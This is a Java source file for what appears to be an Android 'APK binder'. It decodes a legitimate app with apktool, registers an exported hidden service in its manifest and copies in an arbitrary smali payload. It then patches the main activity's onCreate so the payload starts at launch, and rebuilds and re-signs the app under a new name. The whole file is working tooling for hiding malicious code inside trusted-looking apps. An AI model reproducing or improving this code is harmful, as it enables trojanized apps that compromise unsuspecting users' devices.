package binder;

import brut.apktool.Main;
import orig.SignApk;
import s.Sign;
import utils.*;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Binder {
    public interface ConsoleProcess{
        void onFinish(String output);
    }
    private ConsoleProcess consoleProcess;
    private Constants constants;

    public Binder(){
        constants = new Constants();
    }
    public void decodeApk(File apkFile, ConsoleProcess consoleProcess){
        this.consoleProcess = consoleProcess;
        String[] args = new String[]{"d", "-f", apkFile.getPath().trim()};
        runApktool(apkFile, args);
    }
    public void buildApk(File apkFile, ConsoleProcess consoleProcess){
        this.consoleProcess = consoleProcess;
        String[] args = new String[]{"b", apkFile.getPath().trim()};
        runApktool(apkFile, args);
    }
    private void runApktool(File apkFile, String[] args){
        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            PrintStream printStream = System.out;
            System.setOut(new PrintStream(byteArrayOutputStream));
            if(apkFile.exists()) {
                Main.main(args);
            }else {
                throw new Exception(constants.APK_NOT_FOUND_ERROR);
            }
            System.out.flush();
            System.setOut(printStream);
            consoleProcess.onFinish(byteArrayOutputStream.toString());
        }catch (Exception ex){
            System.out.println(ex.getMessage());
            ex.printStackTrace();
            consoleProcess.onFinish(ex.getMessage());
        }
    }
    public void signApk(File apkFile, ConsoleProcess consoleProcess){
        try {
            if(apkFile.exists()) {
                Sign.main(new String[]{apkFile.getPath()});
                while (true){
                    Thread.sleep(500);
                    if(new File(apkFile.getParent() + "\\" + getFilenameWithoutExtension(apkFile.getName())+".s.apk").exists()){
                        break;
                    }
                }
                consoleProcess.onFinish("[+] Apk signed.");
            }else{
                throw new Exception(constants.APK_NOT_FOUND_ERROR);
            }
        }catch (Exception e){
            e.printStackTrace();
            System.out.println(e.getMessage());
        }
    }
    public void bindApk(File apkFile, File smaliFile){
        /*
         * 1- Edit Manifest file -> Add service tags
         * 2- Edit service package
         * 3- Edit Smali file -> Start service
         * 4- Build and sign
         * */
        if(apkFile.exists() && smaliFile.exists()){
            decodeApk(apkFile, output1 -> {
                try {
                    if(output1.split("I:")[output1.split("I:").length-1].contains("Copying original files...")) {  /* Check last info */
                        File manifestFile = new File(apkFile.getParent() + "\\" + getFilenameWithoutExtension(apkFile.getName()) + "\\AndroidManifest.xml");
                        if (!manifestFile.exists()) { throw new Exception(constants.MANIFEST_NOT_FOUND_ERROR); }
                        String manifestContent = readFile(manifestFile.getPath()).replace("\n", "").replace("\r", "");
                        Matcher manifestMatcher = constants.manifestPattern1.matcher(manifestContent);
                        String androidName = "";
                        if (manifestMatcher.find()){
                            androidName = manifestMatcher.group(0).replace("<activity android:name=\"", "")
                                    .replaceAll("\">(.+?)<intent-filter>(.+?)+", "");
                        }
                        if(androidName.length()<5 | androidName.split("[.]").length == 0){ throw new Exception(constants.MANIFEST_PARSE_ERROR);}
                        String epFilePath = manifestFile.getParent() + "\\smali";
                        for(int i = 0; i < androidName.split("[.]").length-1; i++){
                            epFilePath += "\\" + androidName.split("[.]")[i];
                        }
                        epFilePath += "\\" + androidName.split("[.]")[androidName.split("[.]").length-1] + ".smali";
                        File epSmaliFile = new File(epFilePath);
                        if(!epSmaliFile.exists()){throw new Exception(constants.EP_SMALI_NOT_FOUND_ERROR);}
                        /*Edit Manifest*/
                        String smaliPackage = androidName.replace("."+androidName.split("[.]")[androidName.split("[.]").length-1], "") + "." +
                                getFilenameWithoutExtension(smaliFile.getName());
                        String serviceElement = "<service android:enabled=\"true\" android:exported=\"true\" android:name=\""+ smaliPackage+ "\"/>";
                        if(!writeFile(manifestFile.getPath(), manifestContent.replace(manifestMatcher.group(0), manifestMatcher.group(0)+serviceElement))){
                            throw new Exception(constants.FILE_WRITE_ERROR);}
                        /*Copy smali and edit package*/
                        File newSmaliFile = new File(epSmaliFile.getParent()+"\\"+smaliFile.getName());
                        if(!copyFile(smaliFile.getPath(), newSmaliFile.getPath())){ throw new Exception(constants.FILE_COPY_ERROR);}
                        String newSmaliFileContent = readFile(newSmaliFile.getPath()).replaceAll(".class(.+?)L(.+?)/(.+?);", ".class public L"+
                                smaliPackage.replace(".", "/")+";");
                        if(!writeFile(newSmaliFile.getPath(), newSmaliFileContent)){throw new Exception(constants.FILE_WRITE_ERROR);}
                        /*Edit EP File*/
                        String epSmaliFileContent = readFile(epSmaliFile.getPath());
                        if(!epSmaliFileContent.contains(".method protected onCreate")){ throw new Exception(constants.ONCREATE_NOT_FOUND_ERROR);}
                        String[] epLines = epSmaliFileContent.split(".method protected onCreate")[1].split(".line ");
                        int onCreateLineNum;
                        String onCreateLine, serviceStarterSmali;
                        String onCreateMethod = ".method protected onCreate" + epSmaliFileContent.split(".method protected onCreate")[1]
                                .split(".end method")[0] + ".end method\n";
                        String oldMethod = onCreateMethod;
                        boolean increment = false;
                        for(String epLine:epLines){
                            try{
                                int lineNum = Integer.valueOf(epLine.split("\n")[0].trim());
                                if(epLine.contains("->onCreate") && epLine.contains("Bundle")){
                                    onCreateLineNum = lineNum;
                                    onCreateLine = epLine.replace(String.valueOf(lineNum), "").replace("\n", "")
                                            .replace("\r", "").trim();
                                    serviceStarterSmali = "\n\n\t" + constants.service_starter_smali.replace("<line_num>", String.valueOf(onCreateLineNum+1))
                                            .replace("<class_name>", androidName.replace(".", "/"))
                                            .replaceAll("<service_name>", smaliPackage.replace(".", "/"));
                                    onCreateMethod =  onCreateMethod.replace(onCreateLine, onCreateLine + "" + serviceStarterSmali);
                                    increment = true;
                                }
                                if(increment){
                                    String line = ".line " + epLine;
                                    onCreateMethod = onCreateMethod.replace(line, line.replace(".line " + String.valueOf(lineNum), ".line " +
                                            String.valueOf(lineNum+1)));
                                }
                            }catch (Exception e){
                                /*Cannot convert*/
                            }
                        }
                        if(!writeFile(epSmaliFile.getPath(), epSmaliFileContent.replace(oldMethod, onCreateMethod))){ throw new Exception(constants.FILE_WRITE_ERROR);}
                        /*Build and Sign APK*/
                        buildApk(new File(apkFile.getParent() + "\\" + getFilenameWithoutExtension(apkFile.getName())), output2 -> {
                            try {
                                if (output2.split("I:")[output2.split("I:").length - 1].contains("Built apk...")) {  /* Check last info */
                                    File newApk = new File(apkFile.getParent() + "\\" + getFilenameWithoutExtension(apkFile.getName()) + "\\dist\\" + apkFile.getName());
                                    if(!newApk.exists()){throw new Exception(constants.NEW_APK_NOT_FOUND_ERROR);}
                                    TimeUnit.SECONDS.sleep(1);
                                    signApk(newApk, output3 -> {
                                        try {
                                            if (output3.equals("[+] Apk signed.")) {
                                                File signedApk = new File(newApk.getParent() + "\\" + getFilenameWithoutExtension(newApk.getName())+".s.apk");
                                                if(!signedApk.exists()){throw new Exception(constants.APK_SIGN_ERROR);}
                                                if(!copyFile(signedApk.getPath(), apkFile.getParent() + "\\" +
                                                        getFilenameWithoutExtension(apkFile.getName()) + "_x.apk")){throw new Exception(constants.FILE_COPY_ERROR);}
                                                        /* DONE */
                                            } else {
                                                throw new Exception(constants.APK_SIGN_ERROR);
                                            }
                                        }catch (Exception e){
                                            e.printStackTrace();
                                            System.out.println(e.getMessage());
                                        }
                                    });
                                } else {
                                    throw new Exception(output2);
                                }
                            }catch (Exception e){
                                e.printStackTrace();
                                System.out.println(e.getMessage());
                            }
                        });

                    }else{
                        throw new Exception(output1);
                    }
                }catch (Exception e){
                    e.printStackTrace();
                    System.out.println(e.getMessage());
                }
            });
        }else{
            System.out.println(constants.SMALI_NOT_FOUND_ERROR);
        }

    }
    private String readFile(String filePath){
        StringBuilder content = new StringBuilder();
        String line;
        File file = new File(filePath);
        if(file.exists()){
            try {
                BufferedReader in = new BufferedReader(new FileReader(file.getPath()));
                while ((line = in.readLine()) != null) {
                    content.append(line);
                    content.append("\n");
                }
                in.close();
            }catch (IOException e){
                e.printStackTrace();
            }
        }
        return content.toString();
    }
    private boolean writeFile(String filePath, String content){
        try {
            BufferedWriter writer = new BufferedWriter(new FileWriter(filePath));
            writer.write(content);
            writer.close();
            return true;
        }catch (IOException e){
            e.printStackTrace();
            return false;
        }
    }
    private boolean copyFile(String src, String dst){
        try {
            Files.copy(Paths.get(src), Paths.get(dst), StandardCopyOption.REPLACE_EXISTING);
            return true;
        }catch (IOException e){
            e.printStackTrace();
            return false;
        }
    }
    private String getFilenameWithoutExtension(String filename){
        return filename.replaceFirst("[.][^.]+$", "");
    }

}
